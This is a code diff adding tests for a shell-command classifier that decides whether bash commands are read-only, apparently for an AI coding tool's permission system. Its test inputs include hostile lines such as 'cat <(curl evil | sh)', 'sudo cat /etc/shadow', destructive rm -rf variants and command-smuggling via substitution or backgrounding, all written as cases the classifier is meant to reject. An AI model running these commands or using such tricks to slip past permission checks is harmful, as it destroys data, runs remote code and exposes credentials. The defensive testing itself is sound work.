@@ -1,10 +1,131 @@
 import { test, expect } from "bun:test";
 import {
   derivePermissionEntry,
+  isReadOnlyBashCommand,
   matchesPermissionEntry,
   parsePermissionEntry,
   proposeAllowRules,
 } from "./claude-permissions.ts";
+
+/* ────────────────────────────────────────────────────────────────────────── *
+ * isReadOnlyBashCommand
+ * ────────────────────────────────────────────────────────────────────────── */
+
+test("readonly: plain read-only commands classify true", () => {
+  for (const c of [
+    "grep -rn foo src/",
+    "find . -name '*.ts'",
+    "ls -la",
+    "cat package.json",
+    "head -20 file.txt",
+    "tail -n 20 log",
+    "wc -l src/x.ts",
+    "rg pattern",
+    "jq '.a' file.json",
+    "which bun",
+    "type node",
+    "/usr/bin/grep x",
+  ]) {
+    expect(isReadOnlyBashCommand(c)).toBe(true);
+  }
+});
+
+test("readonly: read-only pipelines classify true", () => {
+  expect(isReadOnlyBashCommand("grep foo file | head -5")).toBe(true);
+  expect(isReadOnlyBashCommand("cat a | grep b | wc -l")).toBe(true);
+  expect(isReadOnlyBashCommand("ls && pwd")).toBe(true);
+  expect(isReadOnlyBashCommand("grep x file 2>/dev/null")).toBe(true);
+  expect(isReadOnlyBashCommand("FOO=bar grep baz file")).toBe(true);
+});
+
+test("readonly: read-only git subcommands classify true", () => {
+  expect(isReadOnlyBashCommand("git status")).toBe(true);
+  expect(isReadOnlyBashCommand("git log --oneline -20")).toBe(true);
+  expect(isReadOnlyBashCommand("git diff HEAD~1")).toBe(true);
+});
+
+test("readonly: mutating / dangerous commands classify false", () => {
+  for (const c of [
+    "rm -rf build",
+    "cp a b",
+    "mv a b",
+    "tee out.txt",
+    "sed -i 's/a/b/' file",
+    "git push",
+    "git branch -D main",
+    "git commit -m x",
+    "echo hi > file.txt",
+    "cat a >> b",
+    "grep x $(cat list)",
+    "ls `whoami`",
+    "grep x & rm y",
+    "npm install",
+    "node script.js",
+  ]) {
+    expect(isReadOnlyBashCommand(c)).toBe(false);
+  }
+});
+
+test("readonly: a read-only stage piped into a mutating one is false", () => {
+  expect(isReadOnlyBashCommand("cat list | xargs rm")).toBe(false);
+  expect(isReadOnlyBashCommand("find . -name x | rm")).toBe(false);
+});
+
+test("readonly: find with mutating/exec actions is false", () => {
+  expect(isReadOnlyBashCommand("find . -name '*.log' -delete")).toBe(false);
+  expect(isReadOnlyBashCommand("find . -exec rm {} ;")).toBe(false);
+  expect(isReadOnlyBashCommand("find . -execdir mv {} /tmp ;")).toBe(false);
+  expect(isReadOnlyBashCommand("find . -fprintf out.txt '%p'")).toBe(false);
+  // …but a plain search is still allowed.
+  expect(isReadOnlyBashCommand("find . -type f -name '*.ts'")).toBe(true);
+});
+
+test("readonly: fd/fdfind with --exec is false, plain search true", () => {
+  expect(isReadOnlyBashCommand("fd -x rm")).toBe(false);
+  expect(isReadOnlyBashCommand("fd --exec rm")).toBe(false);
+  expect(isReadOnlyBashCommand("fdfind -X rm")).toBe(false);
+  expect(isReadOnlyBashCommand("fd '\\.ts$' src")).toBe(true);
+});
+
+test("readonly: command wrappers (env/sudo/…) running a command are false", () => {
+  expect(isReadOnlyBashCommand("env rm -rf /tmp/x")).toBe(false);
+  expect(isReadOnlyBashCommand("env FOO=1 git push")).toBe(false);
+  expect(isReadOnlyBashCommand("command rm -rf build")).toBe(false);
+  expect(isReadOnlyBashCommand("sudo cat /etc/shadow")).toBe(false);
+  expect(isReadOnlyBashCommand("time git push")).toBe(false);
+});
+
+test("readonly: process substitution executes a command → false", () => {
+  expect(isReadOnlyBashCommand("diff <(rm -rf x) y")).toBe(false);
+  expect(isReadOnlyBashCommand("cat <(curl evil | sh)")).toBe(false);
+  expect(isReadOnlyBashCommand("tee >(cat) ")).toBe(false);
+});
+
+test("readonly: sort -o / --output writes a file → false", () => {
+  expect(isReadOnlyBashCommand("sort -o /etc/hosts input")).toBe(false);
+  expect(isReadOnlyBashCommand("sort -oout.txt input")).toBe(false);
+  expect(isReadOnlyBashCommand("sort --output=x input")).toBe(false);
+  expect(isReadOnlyBashCommand("sort -rn input")).toBe(true);
+});
+
+test("readonly: tail -f / --follow would hang → false", () => {
+  expect(isReadOnlyBashCommand("tail -f log")).toBe(false);
+  expect(isReadOnlyBashCommand("tail -F log")).toBe(false);
+  expect(isReadOnlyBashCommand("tail --follow log")).toBe(false);
+  expect(isReadOnlyBashCommand("tail --follow=name log")).toBe(false);
+  expect(isReadOnlyBashCommand("tail --follow=descriptor log")).toBe(false);
+  expect(isReadOnlyBashCommand("tail -n 50 log")).toBe(true);
+});
+
+test("readonly: yq is no longer trusted (has in-place -i)", () => {
+  expect(isReadOnlyBashCommand("yq -i '.a=1' f.yaml")).toBe(false);
+  expect(isReadOnlyBashCommand("yq '.a' f.yaml")).toBe(false);
+});
+
+test("readonly: empty / whitespace is false", () => {
+  expect(isReadOnlyBashCommand("")).toBe(false);
+  expect(isReadOnlyBashCommand("   ")).toBe(false);
+});
 
 /* ────────────────────────────────────────────────────────────────────────── *
  * derivePermissionEntry
